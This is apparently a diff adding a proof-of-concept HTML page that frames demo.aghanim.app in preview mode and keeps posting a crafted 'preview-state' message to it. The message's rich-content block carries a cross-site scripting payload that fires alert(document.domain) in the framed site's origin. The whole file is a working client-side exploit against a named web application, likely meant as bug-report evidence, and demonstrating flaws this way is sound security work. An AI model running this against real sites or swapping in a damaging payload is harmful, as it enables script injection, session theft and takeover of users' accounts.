@@ -1,0 +1,13 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>demo.aghanim.app</title>
+<style>html,body{margin:0;height:100%}iframe{border:0;width:100vw;height:100vh}</style>
+<iframe id="f" src="https://demo.aghanim.app/?preview=on"></iframe>
+<script>
+var f = document.getElementById('f');
+var payload = JSON.stringify({type:'preview-state',page:{id:'p',text:'x',layout:{blocks:[[{
+  id:'b', block:'RichContentBlock', html:'<img src=x onerror=alert(document.domain)>'
+}]]}}});
+// spray every 1.5s so it lands regardless of the hub's ready-handshake timing
+setInterval(function(){ try{ f.contentWindow.postMessage(payload,'*'); }catch(e){} }, 1500);
+</script>
